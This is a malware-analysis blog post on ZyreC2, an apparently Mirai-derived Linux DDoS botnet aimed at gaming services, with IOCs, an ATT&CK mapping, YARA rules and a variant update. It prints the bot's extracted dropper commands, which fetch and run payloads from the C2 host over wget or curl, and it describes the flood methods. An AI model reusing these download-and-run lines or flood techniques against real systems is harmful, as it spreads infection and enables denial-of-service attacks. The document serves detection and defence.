---
title: "ZyreC2: The Game-Obsessed Mirai Fork That Left Its Homework Out"
permalink: /blog/zyrec2-gaming-mirai-ddos/
date: 2026-04-15 00:00:00 +0000
categories: [malware-reversing, threat-intel]
tags: [linux, mirai, botnet, ddos, minecraft, elf, gaming]
image:
  path: /assets/images/social/zyrec2-botnet-2026.png
description: "Deep-dive analysis of ZyreC2, a Mirai-derived Linux DDoS botnet with a nine-method Minecraft flooder, Discord attack module, and VSE targeting — whose developer forgot to strip debug symbols."
---

Two fresh ELF samples landed in the threat intel feed this morning, both just over 250 KB, both 64-bit x86, both carrying a capa risk score of 100. A quick `strings` pass revealed the kind of string that makes an analyst's morning: `/root/Zyre C2/xcompile/x86_64/bin/../include`. The developer forgot to strip debug symbols from production binaries, handing us a guided tour of their botnet.

What follows is a deep look at ZyreC2, a Mirai-derived Linux DDoS bot that goes far beyond its parent's capabilities, adding a nine-method Minecraft protocol flooder, a Discord attack module, Valve Source Engine targeting, and a unique bandwidth reporting system. It is not particularly sophisticated, but it is thorough, and the unstripped debug information makes for unusually readable reverse engineering.

---

## Sample Properties

| Property | Value |
|---|---|
| **Family** | ZyreC2 (internal: "Zyre C2") |
| **Type** | Linux ELF DDoS botnet, Mirai-derived |
| **SHA256 (variant A)** | `8b6fd1c8b2d3f289ee3589630ac87896a4377ce4e018cfc936dea57373df33ab` |
| **SHA256 (variant B)** | `ca306060f225d016522f5b688ab9b13b8ab7dd829df94076b077c9a81941f916` |
| **File size** | 256 121 / 255 426 bytes |
| **Architecture** | ELF64 x86-64, statically linked |
| **Compiler** | GCC 4.1.2 (uClibc), identical to Mirai cross-compiler |
| **Stripped** | No - full symbol table present |
| **C2 domain** | `zyrec2[.]duckdns[.]org` |
| **C2 IP** | `45[.]128[.]119[.]160` (Hetzner DE) |
| **C2 port** | 9506 / TCP |
| **Payload download port** | 1212 / HTTP |
| **First seen (MalwareBazaar)** | 2026-04-13 |
| **Compile timestamp** | Not available - ELF carries no `TimeDateStamp` equivalent; DWARF `.debug_line` file mtimes zeroed |

The two variants are nearly identical builds. Variant B simply omits a `usleep()` call at startup, removing the random startup jitter the main variant uses to spread initial load.

---

## Kill Chain

![ZyreC2 Kill Chain](/assets/images/posts/zyrec2/killchain.png)

---

## Initial Access and Propagation

ZyreC2 spreads through telnet brute-force, exactly as Mirai does. The `do_login_start()` function encodes credentials using a length-prefixed varint scheme (identical to Mirai's protocol), crafts a `gen_offline_uuid()` for the victim, and sends the connection data to the C2 for tracking.

On successful login the C2 sends back a dropper command. The dropper is a familiar sight to anyone who has analyzed Mirai lineage malware:

```c
// Extracted from .rodata at VA 0x41284c
"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; "
"(wget http://%s:1212/%s -O %s || "
" curl http://%s:1212/%s -o %s || "
" busybox wget http://%s:1212/%s -O %s) "
">/dev/null 2>&1; chmod +x %s; ./%s >/dev/null 2>&1 &"
```

The payload server runs on port 1212. The architecture suffix (%s) in the filename means the C2 serves per-architecture binaries, so the same infrastructure targets ARM, MIPS, x86, and PowerPC IoT devices simultaneously.

---

## C2 Connection and Registration

After infection the bot initialises its PRNG using a three-way XOR of `time()`, `getpid() ^ getppid()`, and `clock()`:

```c
// main.c:331-345 (reconstructed from debug line info)
x  = time(NULL);
y  = getpid() ^ getppid();
z  = clock();
// XorShift state seeded, used for bot ID and all RNG
```

The bot's ID is formatted as `Zyre%06u`, a six-digit zero-padded integer derived from the XorShift state. This means the botnet operator can enumerate (and deduplicate) active bots.

C2 resolution first tries `zyrec2[.]duckdns[.]org` via a raw DNS query to Google's 8.8.8.8 on port 53. If resolution fails, it falls back to the hardcoded IP `45[.]128[.]119[.]160`. The TCP socket connects on port 9506 (`htons(9506) = 0x2225`).

The initial registration packet is five bytes:

```
[0x00, 0x00, 0x00, 0x02, 0x08]
```

This is a type-length-value prefix indicating a registration message with bot metadata. After this handshake the bot enters its main receive loop, waiting for attack commands.

The bot periodically reports bandwidth capacity:

```c
// rodata: "SPEED|%lld|%lld"
// Arguments: current TX bytes/sec, RX bytes/sec
```

This gives the operator real-time telemetry about each bot's available bandwidth, useful for selecting the most capable nodes for large-volume attacks.

### C2 Command Table

After the registration handshake the bot loops on `recv()` waiting for command packets. Each packet carries a one-byte command identifier. The full dispatch table, recovered from the switch statement at `main.c:2231` (VA `0x408cd1`), is below. Commands `0x14`, `0x15`, and `0x19` are intercepted before the switch and handled as control messages.

| Cmd byte | Decimal | Handler | Category |
|---|---|---|---|
| `0x00` | 0 | `attack_tcpflood` | TCP flood |
| `0x01` | 1 | `attack_tcpboom` | TCP flood |
| `0x02` | 2 | `attack_tcpkiller` | TCP flood |
| `0x03` | 3 | `attack_tcpbypass` | TCP flood (bypass) |
| `0x04` | 4 | `attack_ovhtcp` | TCP flood (OVH) |
| `0x05` | 5 | `attack_udpflood` | UDP flood |
| `0x06` | 6 | `attack_udpbypass` | UDP flood (bypass) |
| `0x07` | 7 | `attack_vse` | VSE / Steam |
| `0x08` | 8 | `attack_discord` | Discord |
| `0x09` | 9 | `attack_app_http` | HTTP L7 |
| `0x0A` | 10 | `attack_icmpflood` | ICMP |
| `0x0C` | 12 | `attack_handshake` | TCP handshake |
| `0x0D` | 13 | `attack_socket` | Generic socket |
| `0x0E` | 14 | `attack_mcflood` | Minecraft |
| `0x0F` | 15 | `attack_udp_plain` | UDP flood |
| `0x10` | 16 | `attack_tcp_stomp` | TCP STOMP |
| `0x11` | 17 | `attack_udp_std` | UDP flood |
| `0x12` | 18 | `attack_udp_ovh` | UDP flood (OVH) |
| `0x13` | 19 | `attack_udp_hex` | UDP flood |
| `0x14` | 20 | KILL (terminate attack) | Control |
| `0x15` | 21 | STATUS / bot type probe | Control |
| `0x16` | 22 | `attack_tcpplain` | TCP flood |
| `0x19` | 25 | SPEEDTEST (Hetzner probe) | Control |

The gaps at `0x0B` (11), `0x17` (23), and `0x18` (24) are empty switch cases that fall through to the default handler with no action, likely placeholders the author left for future attack types.

### Control Commands

Beyond attack dispatch, three non-attack commands give the operator management visibility.

**KILL (0x14):** Terminates a running attack identified by target address and port. The handler walks the `active_atks` array (32 entries, stride 12 bytes at offset `0x515480`) looking for a matching entry, sends `SIGKILL` to the child process, and frees the slot.

**STATUS (0x15):** A bot-type probe. The handler checks whether the current process name contains the string `"zyre2"` (via `strstr`) and, if so, formats a response using the debug artifact name `"zyre.dbg"`. This lets the operator confirm they are talking to a ZyreC2 node rather than a generic Mirai variant they may have accidentally inherited from another crew.

**SPEEDTEST (0x19):** Opens a TCP connection to `nbg1-speed.hetzner.com`, sends `GET /10GB.bin HTTP/1.0`, reads the response in 4 KB chunks, and accumulates the total bytes received. The result is reported back to the C2 as `SPEED|<bytes>|<bytes>`. Combined with the bot ID, this gives the operator a per-bot bandwidth leaderboard.

---

## Process Killing

Before entering the main loop, `killer_init()` iterates `/proc` and sends `SIGKILL` to any process whose name begins with one of 18 prefixes:

```c
// Pointer table at VA 0x413240 (from killer_init data copy)
const char *kill_list[] = {
    "mirai.", "sora.", "b.", "bot.", "dark.", "hilix.",
    "rakitin.", "neon.", "owari.", "aqua.", "boatnet.", "mozi.",
    "nginx", "x86", "mips", "arm", "ppc", "sh4"
};
```

The list is a Who's Who of Mirai-lineage bots: Owari, Sora, Mozi, Aqua, Boatnet, Hilix, Rakitin. The architecture names (x86, mips, arm, ppc, sh4) target the naming convention where bots rename themselves to their architecture at runtime. ZyreC2 itself names its processes `zyre2.<arch>`, which is notably absent from the kill list.

---

## Attack Capabilities

ZyreC2 implements 22 distinct attack functions, catalogued below.

### Network Layer (L3/L4) Floods

```
attack_udp_plain    Raw UDP flood, random payload
attack_udp_std      Mirai-standard UDP flood
attack_udp_hex      UDP flood with operator-specified hex payload
attack_udp_ovh      UDP flood bypassing OVH scrubbing
attack_udpbypass    Generic UDP anti-DDoS bypass
attack_udpflood     Multi-socket UDP saturation
attack_tcpflood     TCP flood
attack_tcpplain     TCP plain data flood
attack_tcp_stomp    TCP STOMP protocol flood
attack_tcpboom      High-pps SYN/ACK saturation
attack_tcpbypass    TCP with Voxility/OVH bypass headers
attack_tcpkiller    TCP connection teardown flood
attack_ovhtcp       TCP targeting OVH scrubbing infrastructure
attack_icmpflood    ICMP echo flood
attack_handshake    Three-way TCP handshake completion flood
attack_socket       Generic connection exhaustion
```

### Application Layer (L7) Attacks

```
attack_app_http     HTTP GET flood with User-Agent rotation
attack_discord      UDP-based Discord platform disruption
attack_vse          Valve Source Engine query flood
attack_mcflood      Minecraft protocol flood (9 sub-methods)
```

![Attack matrix](/assets/images/posts/zyrec2/attack_matrix.png)

---

## Gaming Platform Targeting

ZyreC2's most unusual feature is its concentration on gaming infrastructure. Three separate attack modules exist for Discord, Steam (Valve Source Engine), and Minecraft specifically.

### Minecraft Flood (attack_mcflood)

The Minecraft flooder implements nine distinct attack modes, each exploiting a different aspect of the Minecraft protocol:

```c
// Method IDs extracted from attack_mcflood() dispatch
// MC_PING     (0)  - Server list ping flood
// MC_HANDSHAKE(7)  - Protocol handshake flood  
// MC_CPS      (8)  - Max connections-per-second
// MC_MOTD     (20) - Server description request flood
// MC_JOIN     (24) - Fake player join packets
// MC_BIGHS    (27) - Oversized handshake (crash attempt)
// MC_PINGJOIN (1)  - Ping immediately followed by fake join
// MC_LONGNAMES(0)  - Join flood with max-length player names
// MC_SPAM     (0)  - Chat message spam flood
```

The `MC_BIGHS` method is particularly destructive: it sends a malformed oversized handshake packet, attempting to trigger a server-side buffer handling error rather than just overwhelming bandwidth. `MC_LONGNAMES` sends join requests with player names padded to the protocol maximum, targeting servers that perform O(n) operations on name strings.

The Minecraft flooder also uses `gen_offline_uuid()` to generate valid-looking offline-mode player UUIDs (the `OfflinePlayer:%s` MD5 scheme):

```c
// gen_offline_uuid() at VA 0x4001c0
// Generates a deterministic UUID from a player name string
// Format used: MD5("OfflinePlayer:" + name)
// Mimics legitimate offline-mode Minecraft client auth
sprintf(name_buf, "OfflinePlayer:%s", player_name);
md5_hash(name_buf, uuid_out);  // produces valid UUID v3
```

This means join packets have realistic UUIDs, reducing the chance that a naive server-side filter catches them purely on malformed authentication.

### Discord Attack (attack_discord)

The Discord module opens multiple raw UDP sockets and floods the target on the Discord voice port range. The implementation opens sockets in parallel (up to a configurable count), sets `SO_BROADCAST`, and non-blocking mode via `fcntl(F_SETFL)`, then sends max-size UDP datagrams in a tight loop.

```c
// attack_discord() at VA 0x403a00
// Target port: 0xffffc351 (signed) = port 50127 (Discord voice range)
// Socket count: configurable from C2 option byte 0x07
mov r15d, 0xffffc351   // target port in little-endian
xor r12d, r12d
.loop:
  socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)
  setsockopt(fd, SOL_SOCKET, SO_BROADCAST, &1, 4)
  fcntl(fd, F_SETFL, O_NONBLOCK|O_RDWR, 0x800)
  inc r12
```

### Valve Source Engine Flood (attack_vse)

The VSE module spoofs Source Engine query packets (`vse_payload` / `vse_payload_len` globals), targeting the Steam server query protocol used by Counter-Strike, Team Fortress 2, and similar titles. By flooding the query port, it can prevent players from seeing server browser entries and disrupt in-game server communication.

---

## HTTP Flood Details

The HTTP flood rotates among three User-Agent strings and constructs standard GET requests:

```
GET <path> HTTP/1.1\r\n
Host: <target>\r\n
User-Agent: <rotating_ua>\r\n
Connection: keep-alive\r\n
```

A separate bandwidth measurement probe targets Hetzner's speedtest endpoint:

```
GET /10GB.bin HTTP/1.0\r\nHost: nbg1-speed.hetzner.com\r\n\r\n
```

This 10 GB endpoint is used to measure the bot's actual available download bandwidth, presumably so the C2 can identify high-bandwidth nodes suitable for amplification attacks. The result is reported back via the `SPEED|%lld|%lld` format string.

---

## Threat Landscape Context

ZyreC2 sits in a measurably larger ecosystem than it did when Mirai first appeared in 2016. Spamhaus tracked a 24% increase in active botnet C2 servers between July and December 2025, and researchers have catalogued over 116 distinct Mirai variant branches from more than 21,000 unique samples. Understanding where ZyreC2 fits helps calibrate its actual risk.

**IZ1H9 (Unit 42, 2023)** is a useful comparison point. Like ZyreC2, IZ1H9 is a direct Mirai descendant, adds novel propagation vectors (thirteen router exploit payloads across D-Link, Zyxel, TOTOLINK devices), and ships multi-architecture binaries. Unlike ZyreC2, IZ1H9 invests in propagation breadth over attack depth: its DDoS method set is closer to baseline Mirai, while ZyreC2 inverts that trade-off, spending its complexity budget on attack variety rather than exploitation modules. ZyreC2 still relies purely on credential brute force for initial access.

**Aisuru-Kimwolf (2025-2026)** represents the far end of the spectrum. Cloudflare documented this botnet reaching 31.4 Tbps and 14.1 billion packets per second -- scale ZyreC2 cannot approach from a 250 KB binary. Aisuru-Kimwolf achieves this through compromise of one to four million hosts, packet randomisation for scrubber evasion, and C2 resilience via DNS TXT record encoding of C2 IPs. ZyreC2 uses a much simpler DuckDNS domain with a hardcoded IP fallback. The gap in operational sophistication is substantial.

**Where ZyreC2 occupies its own niche** is the gaming-specific attack surface. Aisuru-Kimwolf targets gaming generally as a high-value DDoS market. ZyreC2 goes further with protocol-level Minecraft exploitation, a dedicated Discord module, and VSE targeting, suggesting an operator community that spends time as players or server administrators rather than building general-purpose booter infrastructure. This is not unusual: the original Mirai was built specifically to DDoS Minecraft servers, and that gaming-origin DNA recurs repeatedly in the family tree. ZyreC2 is, in a sense, a return to that origin.

The commercial layer documented in Aisuru-Kimwolf (rental via Telegram and Discord) is not visible in ZyreC2's strings or configuration. The single C2 endpoint and lack of any panel or pricing strings suggest private operation rather than a public stresser service.

---

## Code Weaknesses

ZyreC2's author made several operational security mistakes that significantly reduce the botnet's longevity.

**Unstripped debug symbols.** The binary ships with its full symbol table, function names, and source-level line info (`debug_info`, `debug_line`, `debug_str` sections). This turns a reverse engineering session into a code review. The build directory `/root/Zyre C2/xcompile/x86_64/` is embedded in the binary and exposes the developer's working directory name, the toolchain path, and the project name all at once.

**Hardcoded plaintext IP fallback.** If DNS fails, the bot connects to `45[.]128[.]119[.]160` directly. Blocking or sinkholing this address disables bots that cannot resolve the DuckDNS name.

**Predictable bot IDs.** `Zyre%06u` IDs are seeded from PID, time, and clock values. A bot reporting ID `Zyre000042` on a fresh system is easy to enumerate. An analyst running the binary in a controlled environment gets sequential IDs, enabling botnet size estimation.

**DuckDNS dependency.** Reporting the domain to DuckDNS abuse triggers an immediate takedown and redirects all bots to `0.0.0.0`, effectively sinkholing the entire botnet in a single action.

**Unencrypted C2 channel.** The TCP connection on port 9506 carries plaintext commands. Any network tap on the C2 server's subnet captures all attack instructions, target lists, and bot telemetry.

**Self-identification in SPEED reports.** Bandwidth reporting gives an analyst passive visibility into the botnet's composition: bot count, geographic distribution (by latency to C2), and per-node capacity, all without touching a single bot.

---

## IOC Appendix

### Domains (defanged)
```
zyrec2[.]duckdns[.]org
```

### IP Addresses (defanged)
```
45[.]128[.]119[.]160   # C2 / payload server (Hetzner DE)
```

### Ports
```
9506/tcp   C2 command channel
1212/tcp   Payload download server
```

### File Indicators
```
Process name prefix:  zyre2.
Bot ID prefix:        Zyre
Debug artifact name:  zyre.dbg
ELF entry point:      0x400194
```

### Network Signatures
```
# TCP connect to 45.128.119.160:9506
# Initial packet: 00 00 00 02 08
# SPEED report: "SPEED|<int>|<int>\n" on C2 channel
# Payload download: GET http://<ip>:1212/zyre2.<arch> HTTP/1.0
```

---

## MITRE ATT&CK Mapping

| Technique | ID | Notes |
|---|---|---|
| Application Layer Protocol: Web | T1071.001 | HTTP payload download and HTTP flood |
| Brute Force: Password Guessing | T1110.001 | Telnet credential brute force |
| Impair Defenses: Indicator Blocking | T1562.006 | killer_init() kills 18 competing bot families |
| Ingress Tool Transfer | T1105 | Architecture-specific ELF download via port 1212 |
| Network DoS: Direct Network Flood | T1498.001 | 22 DDoS methods across L3/L4/L7 |
| Network DoS: Reflection Amplification | T1498.002 | OVH/Voxility bypass methods |
| Process Discovery | T1057 | /proc scan in killer_init |
| Command and Scripting Interpreter: Unix Shell | T1059.004 | Shell dropper command execution |
| Non-Application Layer Protocol | T1095 | Custom binary TCP C2 on port 9506 |
| Dynamic Resolution: Fast Flux DNS | T1568.001 | DuckDNS for C2 resilience |
| System Information Discovery | T1082 | /proc/cpuinfo and /proc/meminfo reads |

---

## YARA Rules

```text
import "elf"

rule ZyreC2_Linux_Bot {
    meta:
        author      = "Tao Goldi"
        version     = 1
        description = "Detects ZyreC2 Linux ELF botnet - Mirai-derived DDoS bot with gaming-specific attack modules"
        created     = "2026-04-15"
        hash1       = "8b6fd1c8b2d3f289ee3589630ac87896a4377ce4e018cfc936dea57373df33ab"
        hash2       = "ca306060f225d016522f5b688ab9b13b8ab7dd829df94076b077c9a81941f916"
        c2_domain   = "zyrec2.duckdns.org"
        c2_ip       = "45.128.119.160"
        reference   = "https://taogoldi.github.io/reverse-engineer/"

    strings:
        // C2 infrastructure
        $c2_domain       = "zyrec2.duckdns.org" ascii
        $c2_ip           = "45.128.119.160" ascii

        // Bot identity
        $bot_id_fmt      = "Zyre%06u" ascii

        // Build path leaked via debug info
        $build_path      = "/root/Zyre C2" ascii

        // Payload dropper command - Mirai-style but uses port 1212
        $dropper_cmd     = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; (wget http://%s:1212/" ascii

        // Minecraft flood method names unique to ZyreC2
        $mc_bighandshake = "bighandshake" ascii

        // C2 speed reporting string
        $speed_report    = "SPEED|%lld|%lld" ascii

        // Competitor process names killed on startup
        $killer_rakitin  = "rakitin." ascii

        // OfflinePlayer UUID generation (Minecraft offline auth spoofing)
        $offline_uuid    = "OfflinePlayer:%s" ascii

    condition:
        elf.type == elf.ET_EXEC
        and elf.machine == elf.EM_X86_64
        and (
            // Primary: build path + C2 domain
            ($build_path and $c2_domain)
            or
            // Secondary: bot ID format + Minecraft attack + speed report
            ($bot_id_fmt and $mc_bighandshake and $speed_report)
            or
            // Tertiary: unique competitor kill name + dropper + speed report
            ($killer_rakitin and $dropper_cmd and $speed_report)
            or
            // Quaternary: C2 IP + offline UUID + speed report
            ($c2_ip and $offline_uuid and $speed_report)
        )
}

rule ZyreC2_Bot_Dropper_Command {
    meta:
        author      = "Tao Goldi"
        version     = 1
        description = "Detects ZyreC2 telnet dropper command in network traffic or extracted strings"
        created     = "2026-04-15"

    strings:
        $dropper = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; (wget http://%s:1212/%s" ascii
        $c2      = "zyrec2.duckdns.org" ascii
        $speed   = "SPEED|%lld|%lld" ascii

    condition:
        2 of ($dropper, $c2, $speed)
}
```

---

## Conclusion

ZyreC2 sits in a crowded but active corner of the IoT threat landscape: Mirai forks targeting cheap VPS hosts and gaming infrastructure. What makes it stand out from the baseline is the specificity of its gaming attacks. Nine Minecraft protocol modes, including a crash attempt via oversized handshake and a UUID-spoofed fake-join flood, suggest an operator who spends meaningful time playing or running Minecraft servers. The VSE and Discord modules point the same direction. This is not a nation-state toolkit; it is someone with a grudge against game servers and enough C programming knowledge to extend Mirai's source.

The operational security failures are chronic. Leaving debug symbols in a production binary is the equivalent of shipping source code. Combined with a sinkhole-ready DuckDNS domain and a plaintext C2 channel, this botnet's infrastructure can be disrupted quickly once the C2 domain is reported. The bandwidth reporting feature, while clever for botnet management, also provides defenders with a free census of the infected population.

For defenders, blocking port 1212 outbound and dropping connections to `45[.]128[.]119[.]160:9506` are the highest-leverage mitigations. For Minecraft server operators, rate-limiting handshake packets and rejecting oversized handshake frames eliminates the most dangerous attack modes.

---

## Update 2026-04-20: Variant C observed, plus corrections

Five days after the original post, a third ZyreC2 build arrived in the feed. Same family, same C2 domain, rotated infrastructure, and a few behaviors that let us correct some claims from the first pass.

### Variant C sample properties

| Property | Value |
|---|---|
| **SHA256** | `89fd6c771387c63ebe8d71d6326e10390550140a3385de99e51dc4ab9b7d068b` |
| **MD5** | `38defb47bffb8a507f57ed3716cf47d0` |
| **File size** | 300 506 bytes (+44 KB vs variants A/B) |
| **Architecture** | ELF64 x86-64, statically linked, uClibc |
| **Stripped** | No, full symbol table + DWARF debug info |
| **C2 domain** | `zyrec2[.]duckdns[.]org` (unchanged) |
| **C2 IP** | `176[.]65[.]139[.]253` (AS214472 Offshore LC, Kerkrade NL) |
| **C2 port** | 9506 / TCP (unchanged; `htons(9506) = 0x2225`) |
| **Payload download port** | 1212 / HTTP (unchanged) |
| **Build path** | `/root/Zyre C2/xcompile/x86_64/` (unchanged) |
| **First seen** | 2026-04-19 |

Infrastructure rotated from Hetzner DE (`45.128.119.160`) to a bulletproof-style host in the Netherlands. DuckDNS absorbs the change transparently.

### Dropper simplification

Variant C ships a much shorter dropper string:

```
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;
(wget http://%s:1212/cat.sh -O cat.sh && sh cat.sh) >/dev/null 2>&1 &
```

Compared to variants A/B, the multi-method fallback chain (`curl` and `busybox wget`), the `chmod +x`, and the architecture suffix `%s` in the filename are gone. The bot now delegates architecture selection and execution to a single stage-one shell script `cat.sh` served from port 1212. This is a shift to a staged loader design.

### Propagation

Variant C contains no telnet brute-force scanner. `nm` shows no scanner-related symbols, and the `.rodata` section holds none of the usual default-credential strings (`xc3511`, `vizxv`, `root`, `admin`, etc.). Propagation in this variant depends entirely on the operator's external distribution of the `cat.sh` URL. Whether variants A/B still ship the brute-force scanner was inferred in the original post; for variant C it is confirmed absent.

### Corrections to the April 15 post

**1. `gen_offline_uuid` is not real MD5.** The original post described it as `MD5("OfflinePlayer:" + name)`. Disassembly at `0x4001c0` shows the function seeds four state words with the MD5 initialisation constants (`0x67452301`, `0xefcdab89`, `0x98badcfe`, `0x10325476`) and then runs a custom mixing loop of `ror`, `xor`, `add`, and shifted-byte-XOR operations over each input byte, finishing with UUIDv3 version/variant bit fixups. The output is a valid-looking RFC 4122 UUID but is not the value a real Minecraft server would compute for the same name string, so the "realistic UUIDs" benefit claimed earlier is weaker than stated.

**2. `do_login_start` and `do_handshake` are Minecraft packet builders, not C2 helpers.** Cross-reference analysis (`axt` on both symbols) shows they are called only from inside `attack_mcflood`, never from the main C2 registration path. Their signatures match the public Minecraft protocol:

```
do_handshake(int fd, int pvn, char *address, uint16_t port, int next_state)
do_login_start(int fd, char *name, uint8_t uuid[16])
```

The textbook protobuf-style varint encoder in `do_handshake` (the `shr 7 / and 0x7f / or 0x80` loop, repeated four times for the four varint fields) is therefore part of the Minecraft flood payload builder, not part of the C2 framing. The "length-prefixed varint scheme identical to Mirai's protocol" framing in the April 15 post should be read as applying to `attack_mcflood`, not to C2 registration.

**3. The C2 channel is plaintext. No TLS library is linked.** `nm` on variant C returns zero SSL, TLS, libssl, or libcrypto symbols. The `tls_handshake` and `tls_done` strings that appear in the binary live exclusively in the DWARF `.debug_str` section: they are source-level enum names that leaked into debug info. The operator chose TLS-flavoured labels but shipped a plaintext TCP channel.

**4. C2 registration payload is fixed-byte, not varint.** The 5-byte header `00 00 00 02 08` documented in the original post is followed by `zyre.dbg` (the channel tag the STATUS command is designed to match) and then fields extracted from `/proc/cpuinfo` (`processor`, `model name`, `Hardware`, `Machine`), each written with a single-byte length prefix, with no varint encoder invoked anywhere in `main`.

**5. `attack_discord` destination port.** The 16-bit value stored into `sin_port` is `0xc351`. Read as network byte order, the actual wire destination port is `0x51c3 = 20931`, which is not in Discord's voice-RTP range (50000–65535). Whether the operator intended to call `htons(50001)` and got the byte order wrong, or intended port 20931 from the start, is ambiguous; either way the traffic the flood actually sends does not land on Discord voice infrastructure. The "Discord" label is aspirational rather than technically accurate protocol mimicry.

### What stayed the same

All other behaviors in the April 15 post reproduce exactly in variant C: the 18-process competitor killer list, the `Zyre%06u` bot ID format, the `OfflinePlayer:%s` prefix string, the Hetzner `/10GB.bin` bandwidth probe, the `CAPACITY|%llu|%llu` and `SPEED|%lld|%lld` telemetry messages, the `zyre.dbg` channel marker, and the full attack-command dispatch table. Variant C is a clean descendant build, not a rewrite.

### Variant C YARA supplement

```text
rule ZyreC2_Variant_C {
    meta:
        author    = "Tao Goldi"
        version   = 1
        date      = "2026-04-20"
        reference = "https://taogoldi.github.io/reverse-engineer/blog/zyrec2-gaming-mirai-ddos/"
        hash      = "89fd6c771387c63ebe8d71d6326e10390550140a3385de99e51dc4ab9b7d068b"

    strings:
        $c2_domain  = "zyrec2.duckdns.org" ascii
        $c2_ip_c    = "176.65.139.253" ascii
        $build_path = "/root/Zyre C2/" ascii
        $cat_sh     = "wget http://%s:1212/cat.sh" ascii
        $dbg_tag    = "zyre.dbg" ascii

    condition:
        uint32(0) == 0x464C457F
        and (
            ($build_path and $c2_ip_c)
            or ($cat_sh and $dbg_tag)
            or ($c2_domain and $cat_sh)
        )
}
```

### Defender actions for variant C

- Block or sinkhole `176[.]65[.]139[.]253:9506` in addition to `45[.]128[.]119[.]160:9506`.
- Alert on outbound HTTP GET to `%s:1212/cat.sh` from non-shell user agents; the staged loader design means the first network event is now this single fetch.
- Existing YARA rules from the April 15 post still match variant C on the `$build_path`, `$bot_id_fmt`, `$mc_bighandshake`, `$speed_report`, and `$offline_uuid` strings.

---

![Variant C context](/assets/images/posts/zyrec2/variant_c_logo.png)

---

*Tao Goldi - taogoldi.github.io/reverse-engineer/*
